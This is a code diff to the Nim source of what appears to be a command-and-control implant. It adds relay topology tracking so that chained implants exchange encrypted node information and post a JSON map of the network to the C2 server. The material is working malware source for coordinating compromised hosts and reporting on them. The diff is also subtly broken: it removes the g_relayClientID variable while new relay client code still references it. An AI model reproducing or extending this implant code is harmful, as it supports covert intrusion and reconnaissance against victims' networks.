@@ -13,7 +13,7 @@ from core/webClientListener import getStoredImplantID, storeImplantID
 from config/configParser import parseConfig, INITIAL_XOR_KEY
 import util/[strenc, sysinfo, crypto]
 import core/cmdParser
-import core/relay/[relay_protocol, relay_comm, relay_config]
+import core/relay/[relay_protocol, relay_comm, relay_config, relay_topology]
 import modules/relay/relay_commands
 # Import the global relay server from relay_commands to avoid conflicts
 from modules/relay/relay_commands import g_relayServer, getConnectionStats, broadcastMessage, sendToClient, getConnectedClients
@@ -59,24 +59,25 @@ var
     g_relayRegistrations*: seq[RelayRegistration] = @[]
     # g_relayServer is now imported from relay_commands.nim to avoid conflicts
     
-# Global relay client ID and encryption key for consistent messaging
-var g_relayClientID: string = ""
+# Global relay client encryption key for consistent messaging
 var g_relayClientKey: string = ""
 
-# Global relay server ID (fixed, generated once)
-var g_relayServerID: string = ""
+# Global relay server ID (fixed, generated once) - now in relay_topology module
+# var g_relayServerID: string = ""  # Moved to relay_topology module
 
-# Generate fixed relay server ID
+# Global topology tracking - now imported from relay_topology module
+
+# Generate fixed relay server ID - now in relay_topology module
+# Redirect to the module function
 proc getRelayServerID*(): string =
-    if g_relayServerID == "":
-        # Generate ONCE and reuse forever
-        let config = getRelayConfig()
-        randomize()
-        let randomPart = rand(1000..9999)
-        g_relayServerID = config.implantIDPrefix & "RELAY-SERVER-" & $randomPart
-        when defined debug:
-            echo "[DEBUG] 🆔 Generated FIXED relay server ID: " & g_relayServerID
-    return g_relayServerID
+    return relay_topology.getRelayServerID()
+
+# Helper functions for relay client ID management
+proc getRelayClientID(): string =
+    return relay_topology.getRelayClientID()
+
+proc setRelayClientID(clientID: string) =
+    relay_topology.setRelayClientID(clientID)
 
 # Speed optimization constants - CLIENT-SIDE CONFIGURATION
 when defined(FAST_MODE):
@@ -1037,6 +1038,70 @@ proc httpHandler() {.async.} =
                                 when defined debug:
                                     echo "[DEBUG] 🌐 HTTP Handler: ⚠️  Failed to send confirmation to client: " & msg.fromID
                         
+                        of TOPOLOGY_UPDATE:
+                            when defined debug:
+                                echo "[DEBUG] 🌐 HTTP Handler: Processing topology update from relay client"
+                            
+                            # Parse topology update
+                            let decryptedPayload = decryptPayload(msg.payload, msg.fromID)
+                            let (eventType, nodeInfo) = parseTopologyUpdate(decryptedPayload)
+                            
+                            when defined debug:
+                                echo "[DEBUG] 🌐 Topology: Event=" & eventType & ", Node=" & nodeInfo.nodeID
+                            
+                            # Update local topology and propagate to C2
+                            if not g_topologyInitialized:
+                                g_localTopology = initTopologyInfo(getRelayServerID())
+                                g_topologyInitialized = true
+                            
+                            updateNodeInTopology(g_localTopology, nodeInfo)
+                            
+                            # TODO: Send topology update to C2 server
+                            when defined debug:
+                                echo "[DEBUG] 🌐 Topology: Updated local topology with " & $g_localTopology.nodes.len & " nodes"
+                        
+                        of TOPOLOGY_REQUEST:
+                            when defined debug:
+                                echo "[DEBUG] 🌐 HTTP Handler: Processing topology request from relay client"
+                            
+                            # Send current topology to requesting client
+                            if g_topologyInitialized:
+                                let topologyResponse = createTopologyResponseMessage(
+                                    getRelayServerID(),
+                                    @[msg.fromID, "RELAY-SERVER"],
+                                    g_localTopology
+                                )
+                                
+                                let success = relay_commands.sendToClient(g_relayServer, msg.fromID, topologyResponse)
+                                when defined debug:
+                                    if success:
+                                        echo "[DEBUG] 🌐 Topology: Sent topology response to " & msg.fromID
+                                    else:
+                                        echo "[DEBUG] 🌐 Topology: Failed to send topology response to " & msg.fromID
+                            else:
+                                when defined debug:
+                                    echo "[DEBUG] 🌐 Topology: No topology data available to send"
+                        
+                        of TOPOLOGY_RESPONSE:
+                            when defined debug:
+                                echo "[DEBUG] 🌐 HTTP Handler: Received topology response from relay client"
+                            
+                            # Parse and merge topology from downstream
+                            let decryptedPayload = decryptPayload(msg.payload, msg.fromID)
+                            let downstreamTopology = parseTopologyResponse(decryptedPayload)
+                            
+                            # Merge downstream topology into local topology
+                            if not g_topologyInitialized:
+                                g_localTopology = initTopologyInfo(getRelayServerID())
+                                g_topologyInitialized = true
+                            
+                            # Add all nodes from downstream topology
+                            for nodeID, nodeInfo in downstreamTopology.nodes:
+                                updateNodeInTopology(g_localTopology, nodeInfo)
+                            
+                            when defined debug:
+                                echo "[DEBUG] 🌐 Topology: Merged downstream topology, now have " & $g_localTopology.nodes.len & " total nodes"
+                        
                         of COMMAND, FORWARD, HTTP_REQUEST, HTTP_RESPONSE:
                             when defined debug:
                                 echo "[DEBUG] 🌐 HTTP Handler: ℹ️  Ignoring relay message type: " & $msg.msgType
@@ -1052,6 +1117,13 @@ proc httpHandler() {.async.} =
                     echo "├─ Processed: " & $messageCount & " messages │ Connections: " & $finalStats.connections & " │ Registered: " & $finalStats.registeredClients
                     echo "└─────────────────────────────────────────────────────────"
                     echo ""
+                
+                # 1.5. TOPOLOGY DETECTION: Check for changes in relay client connections
+                if g_relayServer.isListening:
+                    relay_commands.detectTopologyChanges()
+                    when defined debug:
+                        let topologyStats = relay_commands.getCompleteTopology()
+                        echo "[DEBUG] 🌐 Topology: Monitoring " & $topologyStats.nodes.len & " nodes"
             
             # 2. Handle command results - send to C2
             for result in g_commandsToC2:
@@ -1138,6 +1210,43 @@ proc httpHandler() {.async.} =
                 echo "[DEBUG] 🌐 - Consecutive errors: " & $g_networkHealth.consecutiveErrors
                 if g_networkHealth.consecutiveErrors > 0:
                     echo "[DEBUG] 🚨 - Network experiencing issues, using backoff timing"
+            
+            # 5. RELAY TOPOLOGY DETECTION AND REPORTING
+            try:
+                # Detect topology changes every 5 seconds (adjust based on sleep time)
+                let shouldDetectTopology = true  # For testing - detect every cycle
+                
+                if shouldDetectTopology:
+                    when defined debug:
+                        echo "[DEBUG] 🌐 Topology: Running topology detection (cycle " & $httpCycleCount & ")"
+                    
+                    relay_commands.detectTopologyChanges()
+                    
+                    # If we have topology data to send, export it and send to C2
+                    if relay_topology.g_topologyInitialized:
+                        let topologyJson = relay_commands.exportTopologyJSON()
+                        if topologyJson != "":
+                            when defined debug:
+                                echo "[DEBUG] 🌐 Topology: Sending topology update to C2"
+                                echo "[DEBUG] 🌐 Topology: Data size: " & $topologyJson.len & " bytes"
+                            
+                            # Send topology data to C2 via HTTP
+                            webClientListener.postTopologyUpdate(listener, topologyJson)
+                            
+                            when defined debug:
+                                echo "[DEBUG] 🌐 Topology: ✅ Topology update sent to C2"
+                        else:
+                            when defined debug:
+                                echo "[DEBUG] 🌐 Topology: No topology data to send"
+                    else:
+                        when defined debug:
+                            echo "[DEBUG] 🌐 Topology: Topology not yet initialized"
+                else:
+                    when defined debug:
+                        echo "[DEBUG] 🌐 Topology: Skipping topology detection (cycle " & $httpCycleCount & ")"
+            except Exception as topoError:
+                when defined debug:
+                    echo "[DEBUG] 🌐 Topology: Error during topology detection: " & topoError.msg
             
             await sleepAsync(totalSleepMs)
             
@@ -1515,6 +1624,60 @@ proc relayClientHandler(host: string, port: int) {.async.} =
                     # Forwarded message from another implant
                     when defined debug:
                         echo "[DEBUG] 🔗 Relay Client: Received forwarded message"
+                
+                of TOPOLOGY_UPDATE:
+                    when defined debug:
+                        echo "[DEBUG] 🔗 Relay Client: Received topology update from upstream"
+                    
+                    # Parse and store topology update
+                    let decryptedPayload = decryptPayload(msg.payload, msg.fromID)
+                    let (eventType, nodeInfo) = parseTopologyUpdate(decryptedPayload)
+                    
+                    when defined debug:
+                        echo "[DEBUG] 🔗 Topology: Event=" & eventType & ", Node=" & nodeInfo.nodeID
+                    
+                    # Update local topology
+                    if not g_topologyInitialized:
+                        g_localTopology = initTopologyInfo(g_relayClientID)
+                        g_topologyInitialized = true
+                    
+                    updateNodeInTopology(g_localTopology, nodeInfo)
+                    
+                    when defined debug:
+                        echo "[DEBUG] 🔗 Topology: Updated local topology with " & $g_localTopology.nodes.len & " nodes"
+                
+                of TOPOLOGY_REQUEST:
+                    when defined debug:
+                        echo "[DEBUG] 🔗 Relay Client: Received topology request from upstream"
+                    
+                    # Send current topology to upstream
+                    if g_topologyInitialized:
+                        let topologyResponse = createTopologyResponseMessage(
+                            g_relayClientID,
+                            @[g_relayClientID, "RELAY-SERVER"],
+                            g_localTopology
+                        )
+                        
+                        let success = sendMessage(upstreamRelay, topologyResponse)
+                        when defined debug:
+                            if success:
+                                echo "[DEBUG] 🔗 Topology: Sent topology response to upstream"
+                            else:
+                                echo "[DEBUG] 🔗 Topology: Failed to send topology response"
+                    else:
+                        when defined debug:
+                            echo "[DEBUG] 🔗 Topology: No topology data available to send"
+                
+                of TOPOLOGY_RESPONSE:
+                    when defined debug:
+                        echo "[DEBUG] 🔗 Relay Client: Received topology response from upstream"
+                    
+                    # This would be unusual for a client to receive, but handle it
+                    let decryptedPayload = decryptPayload(msg.payload, msg.fromID)
+                    let upstreamTopology = parseTopologyResponse(decryptedPayload)
+                    
+                    when defined debug:
+                        echo "[DEBUG] 🔗 Topology: Received topology with " & $upstreamTopology.nodes.len & " nodes"
                 
                 else:
                     when defined debug:
